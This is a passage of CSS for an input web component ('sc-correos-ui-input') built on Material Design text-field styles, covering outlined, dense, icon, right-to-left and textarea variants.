			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.38)
			}

			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.87)
			}

			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #6200ee;
				border-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined 250ms 1
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input {
				border-radius: 4px 0 0 4px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
				border-radius: 0 4px 4px 0
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-radius: 0 4px 4px 0
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
				border-radius: 4px 0 0 4px
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-37.25px) scale(1);
				transform: translateY(-37.25px) scale(1)
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.75rem
			}

			.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-34.75px) scale(0.75);
				transform: translateY(-34.75px) scale(0.75)
			}

			.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 1rem
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
				padding-top: 1px
			}

			.mdc-text-field--outlined.sc-correos-ui-input::before,
			.mdc-text-field--outlined.sc-correos-ui-input::after {
				content: none
			}

			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) {
				background-color: transparent
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex;
				padding: 12px 16px 14px;
				border: none !important;
				background-color: transparent;
				z-index: 1
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				z-index: 2
			}

			.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
				padding-top: 2px
			}

			.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-width: 2px
			}

			.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input {
				background-color: transparent
			}

			.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.06)
			}

			.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				border-bottom: none
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input {
				height: 48px
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-134%) scale(1);
				transform: translateY(-134%) scale(1)
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.8rem
			}

			.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-120%) scale(0.8);
				transform: translateY(-120%) scale(0.8)
			}

			.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 1rem
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-dense 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined-dense 250ms 1
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding: 12px 12px 7px
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				top: 14px
			}

			.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				top: 12px
			}

			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: 16px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 16px
			}

			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 16px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 48px
			}

			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 48px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 48px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: 16px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 16px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 16px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 48px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-37.25px) translateX(-32px) scale(1);
				transform: translateY(-37.25px) translateX(-32px) scale(1)
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
				-webkit-transform: translateY(-37.25px) translateX(32px) scale(1);
				transform: translateY(-37.25px) translateX(32px) scale(1)
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.75rem
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-34.75px) translateX(-32px) scale(0.75);
				transform: translateY(-34.75px) translateX(-32px) scale(0.75)
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input,
			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
				-webkit-transform: translateY(-34.75px) translateX(32px) scale(0.75);
				transform: translateY(-34.75px) translateX(32px) scale(0.75)
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 1rem
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined[dir=rtl].sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl 250ms 1
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 36px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 36px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-134%) translateX(-21px) scale(1);
				transform: translateY(-134%) translateX(-21px) scale(1)
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
				-webkit-transform: translateY(-134%) translateX(21px) scale(1);
				transform: translateY(-134%) translateX(21px) scale(1)
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.8rem
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-120%) translateX(-21px) scale(0.8);
				transform: translateY(-120%) translateX(-21px) scale(0.8)
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input,
			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
				-webkit-transform: translateY(-120%) translateX(21px) scale(0.8);
				transform: translateY(-120%) translateX(21px) scale(0.8)
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 1rem
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense 250ms 1
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense[dir=rtl].sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl 250ms 1
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 32px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 32px
			}

			.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: initial;
				right: 12px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: 12px;
				right: initial
			}

			.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 48px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 16px
			}

			.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: initial;
				right: 16px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: 16px;
				right: initial
			}

			.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 48px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 16px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: 16px;
				right: auto
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: auto;
				right: 16px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
				right: 12px;
				left: auto
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				right: auto;
				left: 12px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 48px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 48px;
				padding-right: 48px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				bottom: 16px;
				-webkit-transform: scale(0.8);
				transform: scale(0.8)
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: 12px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 12px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 44px;
				padding-right: 16px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 44px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 44px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 44px
			}

			.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: initial;
				right: 12px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: 12px;
				right: initial
			}

			.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 16px;
				padding-right: 44px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 44px;
				padding-right: 16px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				left: 12px;
				right: auto
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				left: auto;
				right: 12px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
				right: 12px;
				left: auto
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
				right: auto;
				left: 12px
			}

			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding-left: 44px;
				padding-right: 44px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
			.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
				padding-left: 44px;
				padding-right: 44px
			}

			.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-70%) scale(0.8);
				transform: translateY(-70%) scale(0.8)
			}

			.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-text-field-dense 250ms 1;
				animation: mdc-floating-label-shake-float-above-text-field-dense 250ms 1
			}

			.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				padding: 12px 12px 0
			}

			.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				font-size: 0.813rem
			}

			.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.813rem
			}

			.mdc-text-field__input.sc-correos-ui-input:required~.mdc-floating-label.sc-correos-ui-input::after,
			.mdc-text-field__input.sc-correos-ui-input:required~.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input::after {
				margin-left: 1px;
				content: "*"
			}

			.mdc-text-field--textarea.sc-correos-ui-input {
				display: -ms-inline-flexbox;
				display: inline-flex;
				width: auto;
				height: auto;
				-webkit-transition: none;
				transition: none;
				overflow: visible
			}

			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.38)
			}

			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
